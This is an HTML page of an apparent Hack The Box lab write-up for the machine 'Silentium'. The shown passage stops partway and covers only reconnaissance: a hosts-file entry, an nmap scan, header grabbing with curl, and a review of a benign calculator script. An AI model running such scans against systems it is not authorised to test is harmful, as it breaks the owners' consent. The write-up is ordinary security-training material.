@@ -1,0 +1,1646 @@
+<!DOCTYPE html> <html lang="en"> <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <meta name="google-site-verification" content="uA_65eRzkHXUyK5QY2Pz3N0D7u0dyMoAHD_SQtaPvVA"> <title>Silentium</title> <meta name="description" content="Account take over into MCP RCE."> <meta name="keywords" content="cybersecurity, CTF, web security, reverse engineering, pentesting, Linux, Python, malware analysis, exploit development"> <meta name="author" content="Biscotti Diskette"> <meta name="google-site-verification" content="uA_65eRzkHXUyK5QY2Pz3N0D7u0dyMoAHD_SQtaPvVA"> <meta property="og:type" content="website"> <meta property="og:title" content="Silentium"> <meta property="og:description" content="Account take over into MCP RCE."> <meta property="og:url" content="https://biscottidiskette.github.io/boxes/99_silentium/"> <meta property="og:image" content="https://biscottidiskette.github.io/assets/img/social-preview.png"> <meta property="og:site_name" content="Biscotti Diskette"> <meta name="twitter:card" content="summary_large_image"> <meta name="twitter:title" content="Silentium"> <meta name="twitter:description" content="Account take over into MCP RCE."> <meta name="twitter:image" content="https://biscottidiskette.github.io/assets/img/social-preview.png"> <script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "Person",
+  "name": "Biscotti Diskette",
+  "url": "https://biscottidiskette.github.io",
+  "sameAs": [
+    
+  ],
+  "jobTitle": "Cybersecurity Researcher",
+  "worksFor": {
+    "@type": "Organization",
+    "name": "Independent",
+    "url": "https://biscottidiskette.github.io"
+  },
+  "image": "https://biscottidiskette.github.io/assets/img/social-preview.png",
+  "description": "Account take over into MCP RCE."
+}
+</script> <meta name="google-site-verification" content="uA_65eRzkHXUyK5QY2Pz3N0D7u0dyMoAHD_SQtaPvVA"> <meta http-equiv="Permissions-Policy" content="interest-cohort=()"> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title> Silentium | Biscotti Diskette </title> <meta name="author" content="Biscotti Diskette"> <meta name="description" content="Account take over into MCP RCE."> <meta name="keywords" content="cybersecurity, CTF, web security, reverse engineering, pentesting, Linux, Python, malware analysis, exploit development"> <link rel="stylesheet" href="/assets/css/bootstrap.min.css?a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link defer rel="stylesheet" href="/assets/css/academicons.min.css?f0b7046b84e425c55f3463ac249818f5"> <link defer rel="stylesheet" href="/assets/css/scholar-icons.css?62b2ac103a88034e6882a5be5f3e2772"> <link defer rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons&amp;display=swap"> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?591dab5a4e56573bf4ef7fd332894c99" media="" id="highlight_theme_light"> <link rel="shortcut icon" href="/assets/img/frontpage/Logo3.png?4f879aeff848659581251777fe0ab074"> <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="stylesheet" href="/assets/css/terminal.css?bebbf314b8406d78caf98717f86a33c1"> <link rel="canonical" href="https://biscottidiskette.github.io/boxes/99_silentium/"> <script src="/assets/js/theme.js?9a0c749ec5240d9cda97bc72359a72c0"></script> <link defer rel="stylesheet" href="/assets/css/jekyll-pygments-themes-native.css?5847e5ed4a4568527aa6cfab446049ca" media="none" id="highlight_theme_dark"> <script>
+    initTheme();
+  </script> <title>Silentium</title> <meta name="description" content="Account take over into MCP RCE."> <meta name="keywords" content="cybersecurity, CTF, web security, reverse engineering, pentesting, Linux, Python, malware analysis, exploit development"> <meta name="author" content="Biscotti Diskette"> <meta name="google-site-verification" content="uA_65eRzkHXUyK5QY2Pz3N0D7u0dyMoAHD_SQtaPvVA"> <meta property="og:type" content="website"> <meta property="og:title" content="Silentium"> <meta property="og:description" content="Account take over into MCP RCE."> <meta property="og:url" content="https://biscottidiskette.github.io/boxes/99_silentium/"> <meta property="og:image" content="https://biscottidiskette.github.io/assets/img/social-preview.png"> <meta property="og:site_name" content="Biscotti Diskette"> <meta name="twitter:card" content="summary_large_image"> <meta name="twitter:title" content="Silentium"> <meta name="twitter:description" content="Account take over into MCP RCE."> <meta name="twitter:image" content="https://biscottidiskette.github.io/assets/img/social-preview.png"> <script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "Person",
+  "name": "Biscotti Diskette",
+  "url": "https://biscottidiskette.github.io",
+  "sameAs": [
+    
+  ],
+  "jobTitle": "Cybersecurity Researcher",
+  "worksFor": {
+    "@type": "Organization",
+    "name": "Independent",
+    "url": "https://biscottidiskette.github.io"
+  },
+  "image": "https://biscottidiskette.github.io/assets/img/social-preview.png",
+  "description": "Account take over into MCP RCE."
+}
+</script> </head> <body class="fixed-top-nav sticky-bottom-footer"> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top" role="navigation"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/"> Biscotti Diskette </a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">about </a> </li> <li class="nav-item "> <a class="nav-link" href="/projects/">projects </a> </li> <li class="nav-item active"> <a class="nav-link" href="/boxes/">boxes <span class="sr-only">(current)</span> </a> </li> <li class="nav-item "> <a class="nav-link" href="/certifications/">certs </a> </li> <li class="nav-item "> <a class="nav-link" href="/repositories/">repos </a> </li> <li class="nav-item "> <a class="nav-link" href="/blog/">blog </a> </li> <li class="nav-item "> <a class="nav-link" href="/contact/">contact </a> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5" role="main"> <div class="post"> <header class="post-header"> <h1 class="post-title">Silentium</h1> <p class="post-description">Account take over into MCP RCE.</p> </header> <article> <div class="row justify-content-sm-center"> <div class="col-sm-4 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/silentium/logo.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="HTB Silentium Logo" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br></p> <h2>Link</h2> <p><a href="https://app.hackthebox.com/machines/Silentium" rel="external nofollow noopener" target="_blank">Room Link</a></p> <p><br></p> <h2>Process</h2> <p><br> This box won’t silence us. Let’s crack Silentium!!</p> <p>First things first, let’s add the box to the <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-4388"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-4388')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-4388')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-4388')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-4388')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-4388">
+┌─[au-dedivip-1]─[10.10.15.20]─[biscottidiskette@htb-oldwz1kkne]─[~]
+└──╼ [★]$ cat /etc/hosts
+127.0.0.1	localhost
+127.0.1.1	pwnbox7.1
+10.129.245.103  silentium.htb
+
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+127.0.0.1 localhost
+127.0.1.1 htb-oldwz1kkne htb-oldwz1kkne.htb-cloud.com
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-4388" onclick="terminalOverlayClose('bash-bash-4388')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-4388')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-4388')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-4388')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-4388" data-language="bash">
+┌─[au-dedivip-1]─[10.10.15.20]─[biscottidiskette@htb-oldwz1kkne]─[~]
+└──╼ [★]$ cat /etc/hosts
+127.0.0.1	localhost
+127.0.1.1	pwnbox7.1
+10.129.245.103  silentium.htb
+
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+127.0.0.1 localhost
+127.0.1.1 htb-oldwz1kkne htb-oldwz1kkne.htb-cloud.com
+</pre> </div> </div> <p><br> Give nmap a run and try to identify the open ports.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-41363"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-41363')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-41363')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-41363')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-41363')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-41363">
+┌─[au-dedivip-1]─[10.10.15.20]─[biscottidiskette@htb-oldwz1kkne]─[~/my_data/machines/silentium]
+└──╼ [★]$ sudo nmap -sC -sV -O -A -oN nmap silentium.htb
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-24 08:21 EDT
+Nmap scan report for silentium.htb (10.129.245.103)
+Host is up (0.0014s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
+|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
+80/tcp open  http    nginx 1.24.0 (Ubuntu)
+|_http-title: Silentium | Institutional Capital &amp; Lending Solutions
+|_http-server-header: nginx/1.24.0 (Ubuntu)
+Device type: general purpose|router
+Running: Linux 5.X, MikroTik RouterOS 7.X
+OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
+OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 1025/tcp)
+HOP RTT     ADDRESS
+1   1.00 ms 10.10.14.1
+2   1.52 ms silentium.htb (10.129.245.103)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 8.37 seconds
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-41363" onclick="terminalOverlayClose('bash-bash-41363')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-41363')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-41363')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-41363')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-41363" data-language="bash">
+┌─[au-dedivip-1]─[10.10.15.20]─[biscottidiskette@htb-oldwz1kkne]─[~/my_data/machines/silentium]
+└──╼ [★]$ sudo nmap -sC -sV -O -A -oN nmap silentium.htb
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-24 08:21 EDT
+Nmap scan report for silentium.htb (10.129.245.103)
+Host is up (0.0014s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
+|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
+80/tcp open  http    nginx 1.24.0 (Ubuntu)
+|_http-title: Silentium | Institutional Capital &amp; Lending Solutions
+|_http-server-header: nginx/1.24.0 (Ubuntu)
+Device type: general purpose|router
+Running: Linux 5.X, MikroTik RouterOS 7.X
+OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
+OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 1025/tcp)
+HOP RTT     ADDRESS
+1   1.00 ms 10.10.14.1
+2   1.52 ms silentium.htb (10.129.245.103)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 8.37 seconds
+</pre> </div> </div> <p><br> Run <code class="language-plaintext highlighter-rouge">curl -I</code> to pull the headers to try to identify technologies.</p> <div class="terminal" data-language="bash" id="terminal-bash-bash-4374"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('bash-bash-4374')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('bash-bash-4374')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('bash-bash-4374')" title="Maximize"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopy('bash-bash-4374')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-bash-bash-4374">
+┌─[au-dedivip-1]─[10.10.15.20]─[biscottidiskette@htb-oldwz1kkne]─[~/my_data/machines/silentium]
+└──╼ [★]$ curl -I http://silentium.htb
+HTTP/1.1 200 OK
+Server: nginx/1.24.0 (Ubuntu)
+Date: Mon, 24 Aug 2026 12:31:16 GMT
+Content-Type: text/html
+Content-Length: 8753
+Last-Modified: Mon, 16 Mar 2026 22:21:29 GMT
+Connection: keep-alive
+ETag: "69b88269-2231"
+Accept-Ranges: bytes
+</pre> </div> <div class="terminal__overlay" id="overlay-bash-bash-4374" onclick="terminalOverlayClose('bash-bash-4374')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('bash-bash-4374')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('bash-bash-4374')" title="Restore"></button> </div> <span class="terminal__title">bash</span> <button class="terminal__copy" onclick="terminalCopyModal('bash-bash-4374')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-bash-bash-4374" data-language="bash">
+┌─[au-dedivip-1]─[10.10.15.20]─[biscottidiskette@htb-oldwz1kkne]─[~/my_data/machines/silentium]
+└──╼ [★]$ curl -I http://silentium.htb
+HTTP/1.1 200 OK
+Server: nginx/1.24.0 (Ubuntu)
+Date: Mon, 24 Aug 2026 12:31:16 GMT
+Content-Type: text/html
+Content-Length: 8753
+Last-Modified: Mon, 16 Mar 2026 22:21:29 GMT
+Connection: keep-alive
+ETag: "69b88269-2231"
+Accept-Ranges: bytes
+</pre> </div> </div> <p><br> Check the landing page the webserver is serving.</p> <div class="row justify-content-sm-center"> <div class="col-sm-8 mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/silentium/landing.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" title="Landing Page" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"> </picture> </figure> </div> </div> <p><br> Check the landing page source code.</p> <div class="terminal" data-language="browser" id="terminal-view-source-http-silentium-htb-browser-32970"> <div class="terminal__header terminal__header--browser"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('view-source-http-silentium-htb-browser-32970')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('view-source-http-silentium-htb-browser-32970')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('view-source-http-silentium-htb-browser-32970')" title="Maximize"></button> </div> <span class="terminal__title">view-source:http://silentium.htb</span> <button class="terminal__copy" onclick="terminalCopy('view-source-http-silentium-htb-browser-32970')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-view-source-http-silentium-htb-browser-32970">
+&lt;!DOCTYPE html&gt;
+&lt;html lang="en"&gt;
+&lt;head&gt;
+  &lt;meta charset="UTF-8" /&gt;
+  &lt;title&gt;Silentium | Institutional Capital &amp; Lending Solutions&lt;/title&gt;
+  &lt;meta name="viewport" content="width=device-width, initial-scale=1.0" /&gt;
+
+  &lt;!-- Tailwind CDN --&gt;
+  &lt;script src="https://cdn.tailwindcss.com"&gt;&lt;/script&gt;
+
+  &lt;!-- Fonts --&gt;
+  &lt;link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&amp;family=Playfair+Display:wght@700&amp;display=swap" rel="stylesheet"&gt;
+
+  &lt;link rel="stylesheet" href="/assets/styles.css"&gt;
+
+  &lt;script&gt;
+    tailwind.config = {
+      theme: {
+        extend: {
+          colors: {
+            silent: {
+              900: '#121417',
+              800: '#1c1f24',
+              700: '#2d3239',
+              DEFAULT: '#c4a484',
+              light: '#fcfaf7',
+              muted: '#6b7280'
+            }
+          }
+        }
+      }
+    }
+  &lt;/script&gt;
+&lt;/head&gt;
+
+&lt;snip&gt;
+
+&lt;/div&gt;
+&lt;/footer&gt;
+&lt;script src="/assets/app.js" defer&gt;&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</pre> </div> <div class="terminal__overlay" id="overlay-view-source-http-silentium-htb-browser-32970" onclick="terminalOverlayClose('view-source-http-silentium-htb-browser-32970')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header terminal__header--browser"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('view-source-http-silentium-htb-browser-32970')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('view-source-http-silentium-htb-browser-32970')" title="Restore"></button> </div> <span class="terminal__title">view-source:http://silentium.htb</span> <button class="terminal__copy" onclick="terminalCopyModal('view-source-http-silentium-htb-browser-32970')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-view-source-http-silentium-htb-browser-32970" data-language="browser">
+&lt;!DOCTYPE html&gt;
+&lt;html lang="en"&gt;
+&lt;head&gt;
+  &lt;meta charset="UTF-8" /&gt;
+  &lt;title&gt;Silentium | Institutional Capital &amp; Lending Solutions&lt;/title&gt;
+  &lt;meta name="viewport" content="width=device-width, initial-scale=1.0" /&gt;
+
+  &lt;!-- Tailwind CDN --&gt;
+  &lt;script src="https://cdn.tailwindcss.com"&gt;&lt;/script&gt;
+
+  &lt;!-- Fonts --&gt;
+  &lt;link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&amp;family=Playfair+Display:wght@700&amp;display=swap" rel="stylesheet"&gt;
+
+  &lt;link rel="stylesheet" href="/assets/styles.css"&gt;
+
+  &lt;script&gt;
+    tailwind.config = {
+      theme: {
+        extend: {
+          colors: {
+            silent: {
+              900: '#121417',
+              800: '#1c1f24',
+              700: '#2d3239',
+              DEFAULT: '#c4a484',
+              light: '#fcfaf7',
+              muted: '#6b7280'
+            }
+          }
+        }
+      }
+    }
+  &lt;/script&gt;
+&lt;/head&gt;
+
+&lt;snip&gt;
+
+&lt;/div&gt;
+&lt;/footer&gt;
+&lt;script src="/assets/app.js" defer&gt;&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</pre> </div> </div> <p><br> Review the JavaScript code looking for anything juicy.</p> <div class="terminal" data-language="javascript" id="terminal-app-js-javascript-61304"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalClose('app-js-javascript-61304')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" onclick="terminalMinimize('app-js-javascript-61304')" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalMaximize('app-js-javascript-61304')" title="Maximize"></button> </div> <span class="terminal__title">app.js</span> <button class="terminal__copy" onclick="terminalCopy('app-js-javascript-61304')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body" id="terminal-body-app-js-javascript-61304">
+// Wait for DOM to load
+document.addEventListener("DOMContentLoaded", () =&gt; {
+
+  // Navbar scroll behavior
+  const nav = document.getElementById("nav");
+  window.addEventListener("scroll", () =&gt; {
+    if (window.scrollY &gt; 60) {
+      nav.classList.add("bg-white/95", "backdrop-blur", "shadow-sm");
+    } else {
+      nav.classList.remove("bg-white/95", "backdrop-blur", "shadow-sm");
+    }
+  });
+
+  // Calculator logic
+  function calc(amount, term, rate = 4.5) {
+    const r = rate / 100 / 12;
+
+    // Safety guard
+    if (r === 0 || term === 0) return 0;
+
+    return (
+      amount * r * Math.pow(1 + r, term)
+    ) / (
+      Math.pow(1 + r, term) - 1
+    );
+  }
+
+  const amount = document.getElementById("amount");
+  const term = document.getElementById("term");
+  const monthly = document.getElementById("monthly");
+  const amountLabel = document.getElementById("amountLabel");
+  const termLabel = document.getElementById("termLabel");
+
+  function update() {
+    const a = Number(amount.value);
+    const t = Number(term.value);
+
+    amountLabel.textContent = `$${a.toLocaleString()}`;
+    termLabel.textContent = t;
+    monthly.textContent = `$${calc(a, t).toFixed(2)}`;
+  }
+
+  amount.addEventListener("input", update);
+  term.addEventListener("input", update);
+
+  // Initial render
+  update();
+});
+</pre> </div> <div class="terminal__overlay" id="overlay-app-js-javascript-61304" onclick="terminalOverlayClose('app-js-javascript-61304')"> <div class="terminal__modal" onclick="event.stopPropagation()"> <div class="terminal__header"> <div class="terminal__controls"> <button class="terminal__dot terminal__dot--red" onclick="terminalOverlayClose('app-js-javascript-61304')" title="Close"></button> <button class="terminal__dot terminal__dot--yellow" title="Minimize"></button> <button class="terminal__dot terminal__dot--green" onclick="terminalOverlayClose('app-js-javascript-61304')" title="Restore"></button> </div> <span class="terminal__title">app.js</span> <button class="terminal__copy" onclick="terminalCopyModal('app-js-javascript-61304')" title="Copy to clipboard"> <svg class="terminal__copy-icon" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"> <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect> <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path> </svg> <span class="terminal__copy-label">copy</span> </button> </div> <pre class="terminal__body terminal__body--modal" id="terminal-modal-body-app-js-javascript-61304" data-language="javascript">
+// Wait for DOM to load
+document.addEventListener("DOMContentLoaded", () =&gt; {
+
+  // Navbar scroll behavior
+  const nav = document.getElementById("nav");
+  window.addEventListener("scroll", () =&gt; {
+    if (window.scrollY &gt; 60) {
+      nav.classList.add("bg-white/95", "backdrop-blur", "shadow-sm");
+    } else {
+      nav.classList.remove("bg-white/95", "backdrop-blur", "shadow-sm");
+    }
+  });
+
+  // Calculator logic
+  function calc(amount, term, rate = 4.5) {
+    const r = rate / 100 / 12;
+
+    // Safety guard
+    if (r === 0 || term === 0) return 0;
+
+    return (
+      amount * r * Math.pow(1 + r, term)
+    ) / (
+      Math.pow(1 + r, term) - 1
+    );
+  }
+
+  const amount = document.getElementById("amount");
+  const term = document.getElementById("term");
+  const monthly = document.getElementById("monthly");
+  const amountLabel = document.getElementById("amountLabel");
+  const termLabel = document.getElementById("termLabel");
+
+  function update() {
+    const a = Number(amount.value);
+    const t = Number(term.value);
+
+    amountLabel.textContent = `$${a.toLocaleString()}`;
+    termLabel.textContent = t;
+    monthly.textContent = `$${calc(a, t).toFixed(2)}`;
+  }
+
+  amount.addEventListener("input", update);
+  term.addEventListener("input", update);
+
+  // Initial render
+  update();
+});
